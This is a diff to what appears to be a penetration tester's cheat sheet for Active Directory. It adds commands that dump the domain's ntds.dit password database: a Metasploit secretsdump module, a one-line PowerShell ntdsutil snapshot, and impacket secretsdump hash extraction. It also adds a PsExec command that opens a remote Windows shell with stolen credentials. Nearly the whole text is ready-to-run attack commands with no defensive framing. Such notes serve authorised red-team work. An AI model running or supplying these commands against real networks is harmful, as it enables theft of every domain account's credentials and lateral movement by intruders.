@@ -160,3 +160,13 @@ create full c:\output
 quit
 quit
 secretsdump.py -ntds '/Location/of/ntds.dit' -system '/Location/of/registry/SYSTEM' -outputfile hashes LOCAL
+
+# Grab everything from Active Directory
+use metasploit module auxiliary/scanner/smb/impacket/secretsdump
+
+# Grab ntds.dit from powershell (one line)
+powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
+
+
+#remote windows shell (psexec)
+PsExec.exe \\ip_address -u username -p password cmd.exe
